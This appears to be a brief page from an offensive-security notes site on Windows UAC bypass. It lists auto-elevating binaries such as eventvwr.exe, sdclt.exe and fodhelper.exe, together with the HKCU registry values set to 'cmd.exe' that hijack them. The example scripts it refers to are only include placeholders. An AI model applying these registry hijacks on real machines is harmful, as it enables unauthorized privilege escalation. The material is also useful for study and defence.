---
title: UAC Bypass
---

# UAC Bypass

## Vulnerable programs
### `CompMgmtLauncher.exe`

### `eventvwr.exe`
- Windows 7/8/10
- `HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command` = `"cmd.exe"`

### `sdclt.exe`
- Windows 10
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` = `"cmd.exe"`

### `fodhelper.exe`
- Windows 10
- `HKCU\Software\Classes\ms-settings\shell\open\command` = `"DelegateExecute"`
- `HKCU\Software\Classes\ms-settings\shell\open\command` = `"cmd.exe"`


## Examples

{{< details "WScript Example" >}}
{{% code file="windows/privilege-escalation/uac-bypass.vbs" language="wscript" %}}
{{< /details >}}

{{< details "Batch Example" >}}
{{% code file="windows/privilege-escalation/uac-bypass.bat" language="batch" %}}
{{< /details >}}
